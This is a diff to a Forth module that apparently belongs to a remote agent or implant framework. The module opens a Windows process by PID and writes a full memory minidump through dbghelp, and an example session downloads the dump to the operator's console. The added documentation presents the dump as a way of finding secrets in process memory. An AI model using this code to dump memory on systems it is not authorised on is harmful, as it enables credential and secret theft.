@@ -6,8 +6,9 @@
 
  minidump.fth
 
- Given a process ID, collect a minidump and download it to the server console
- system.
+ Given a process ID, collect a minidump for analysis or download.  This is a
+ full memory dump of the process, so it can be very useful for finding secrets
+ or examining the running state of a process.		     
 
      PID minidump
 
@@ -29,6 +30,10 @@
      [+] Done, minidump successful.
      [+] Cleaning up handles.
      ----- END OUTPUT -----
+     1  [sunglow]  -> download md_B587.tmp
+     1  [sunglow]  -> 
+     ---- BEGIN OUTPUT ----
+     Downloading file 'md_B587.tmp' of 46946372 bytes
 
  This command will write the file out to a temporary filename in the current
  directory (think about where you are first -- you might not want to write
@@ -42,6 +47,7 @@
   tuck swap ! !here
 ;
 
+\ Some misc. constants from the Win32 API
 260       value MAX_PATH
 $40000000 value GENERIC_WRITE
 $1        value FILE_SHARE_READ
@@ -53,6 +59,7 @@ $40       value PROCESS_DUP_HANDLE
 $1fffff   value THREAD_ALL_ACCESS
 $2        value MiniDumpWithFullMemory
 
+\ We depend on the debug API for memory dumps
 loadlib dbghelp.dll
 value dbghelp.dll
 
@@ -62,12 +69,16 @@ kernel32 7 dllfun CreateFile CreateFileA
 
 dbghelp.dll 7 dllfun MiniDumpWriteDump MiniDumpWriteDump
 
+\ Some state variables to keep track of our resources.  It's not very
+\ "Forth"ish, but neither is error handling in the Win32 API :-).
+
 create filename MAX_PATH allot
 
 0 value phandle
 0 value fhandle
 0 value dpid
 
+\ Open a temp file in the current directory for writing
 : temp-file
   s" ." drop s" md_" drop 0 filename GetTempFileName if
     filename GENERIC_WRITE FILE_SHARE_READ 0 CREATE_ALWAYS FILE_ATTRIBUTE_NORMAL 0 CreateFile
@@ -83,9 +94,14 @@ create filename MAX_PATH allot
   PROCESS_DUP_HANDLE or
 ;
 
+\ Open a process to dump
 : get-proc ( pid -- )
   procflags 0 rot OpenProcess [to] phandle
 ;
+
+\ This is written in an exception-handling style that I find quite comfortable
+\ compared to catching every error along the way and nesting a ton of
+\ conditionals for all the resource management.
 
 : minidump ( pid -- )
   .pre [to] dpid
@@ -93,13 +109,11 @@ create filename MAX_PATH allot
   try
     \ first, open a handle to the process with the right permissions
     ." [+] Opening the process\n"
-    '{ dpid get-proc }' '{ phandle CloseHandle drop }' attempt
-    phandle +assert
+    '{ dpid get-proc }' '{ phandle CloseHandle drop }' attempt phandle +assert
     
     \ now, open a temporary file to write the dump to
     ." [+] Creating a temp file\n"
-    '{ temp-file }' '{ fhandle CloseHandle drop }' attempt
-    fhandle +assert
+    '{ temp-file }' '{ fhandle CloseHandle drop }' attempt fhandle +assert
     
     \ user needs to know where it is!
     ." [+] Writing to " filename .cstring cr
